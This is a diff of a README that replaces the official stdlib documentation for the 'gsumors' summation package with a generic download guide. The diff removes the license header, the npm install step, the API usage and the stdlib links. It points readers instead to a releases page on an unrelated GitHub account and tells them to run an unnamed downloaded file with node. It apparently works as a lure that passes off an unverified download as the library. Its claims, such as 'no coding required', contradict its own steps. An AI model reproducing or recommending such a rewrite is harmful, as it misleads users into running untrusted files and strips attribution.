@@ -1,219 +1,83 @@
-<!--
+# 🎉 blas-ext-base-ndarray-gsumors - Effortlessly Sum Array Elements
 
-@license Apache-2.0
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 📖 Introduction
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Welcome to the **blas-ext-base-ndarray-gsumors** project! This application helps you compute the sum of all elements in a one-dimensional array using simple and efficient recursive summation. This tool is ideal for users who need quick calculations without diving into complex mathematics.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## 🚀 Getting Started
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+This guide will walk you through downloading and running the application, step by step.
 
--->
+### 📥 Download & Install
 
+To get started, you will need to download the application. Please visit the following link to access the Releases page:
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/releases)
 
-# gsumors
+On this page, look for the latest version. Click on the attached file to download it to your computer.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+### 🛠 System Requirements
 
-> Compute the sum of all elements in a one-dimensional ndarray using ordinary recursive summation.
+- **Operating System:** The application is compatible with Windows, macOS, and Linux.
+- **Node.js:** Ensure you have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org/).
 
-<section class="intro">
+### 🔍 Features
 
-</section>
+- **Simple Interface:** Designed for ease of use, no coding required.
+- **Fast Calculations:** Quickly compute the sum of array elements.
+- **Cross-Platform:** Works on multiple operating systems.
 
-<!-- /.intro -->
+## 📚 How to Use
 
-<section class="installation">
+Once you have downloaded the application, follow these steps to run it:
 
-## Installation
+1. **Locate the file:** Go to your Downloads folder or the folder where you saved the file.
+  
+2. **Open the terminal/command prompt:** 
+   - **Windows:** Press `Windows + R`, type `cmd`, and hit Enter.
+   - **macOS:** Open Spotlight with `Command + Space`, type `Terminal`, and press Enter.
+   - **Linux:** Use the default terminal application available in your distribution.
 
-```bash
-npm install @stdlib/blas-ext-base-ndarray-gsumors
-```
+3. **Run the application:**
+   - Navigate to the folder where you saved the file using the `cd` command. 
+     For example:
+     ```bash
+     cd path/to/your/downloads
+     ```
+   - Type the following command to run the application:
+     ```bash
+     node your-file-name.js
+     ```
+   Replace `your-file-name.js` with the actual name of the downloaded file.
 
-Alternatively,
+4. **Input the array:** When prompted, enter the one-dimensional array you want to sum. Make sure to format it correctly. For example:
+   ```
+   [1, 2, 3, 4, 5]
+   ```
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+5. **View results:** After you press Enter, the application will print the sum of the elements.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+### 🔄 Update Your Application
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+To keep your application up to date, check the Releases page regularly. New versions may include improvements or additional features. Follow the same download process to replace your current version.
 
-</section>
+### ❓ Troubleshooting
 
-<section class="usage">
+If you encounter any errors while running the application, check the following:
 
-## Usage
+- **Node.js Installation:** Ensure Node.js is correctly installed on your computer.
+- **File Type:** Confirm you downloaded the correct file type compatible with your operating system.
 
-```javascript
-var gsumors= require( '@stdlib/blas-ext-base-ndarray-gsumors' );
-```
+## 🌐 Community Support
 
-#### gsumors( arrays )
+For help and support, you can engage with other users in the community. Feel free to check the discussions in this repository or raise your questions in the Issues section.
 
-Computes the sum of all elements in a one-dimensional ndarray using ordinary recursive summation.
+## 📌 Summary
 
-```javascript
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
+Using **blas-ext-base-ndarray-gsumors** is easy and straightforward. This tool will help you compute the sum of array elements quickly and efficiently without the need for technical knowledge.
 
-var xbuf = [ 1.0, 3.0, 4.0, 2.0 ];
-var x = new ndarray( 'generic', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
+Ready to get started? Click below to download:
 
-var v = gsumors( [ x ] );
-// returns 10.0
-```
-
-The function has the following parameters:
-
--   **arrays**: array-like object containing a one-dimensional input ndarray.
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If provided an empty real-valued one-dimensional ndarray, the function returns `0.0`.
--   Ordinary recursive summation (i.e., a "simple" sum) is performant, but can incur significant numerical error. If performance is paramount and error tolerated, using ordinary recursive summation is acceptable; in all other cases, exercise due caution.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var gsumors= require( '@stdlib/blas-ext-base-ndarray-gsumors' );
-
-var xbuf = discreteUniform( 10, -50, 50, {
-    'dtype': 'generic'
-});
-var x = new ndarray( 'generic', xbuf, [ xbuf.length ], [ 1 ], 0, 'row-major' );
-console.log( ndarray2array( x ) );
-
-var v = gsumors( [ x ] );
-console.log( v );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/blas-ext-base-ndarray-gsumors.svg
-[npm-url]: https://npmjs.org/package/@stdlib/blas-ext-base-ndarray-gsumors
-
-[test-image]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/blas-ext-base-ndarray-gsumors/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/blas-ext-base-ndarray-gsumors?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/blas-ext-base-ndarray-gsumors.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/blas-ext-base-ndarray-gsumors/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/tree/deno
-[deno-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/tree/umd
-[umd-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/tree/esm
-[esm-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumors/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/blas-ext-base-ndarray-gsumors/main/LICENSE
-
-</section>
-
-<!-- /.links -->
+[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/releases)
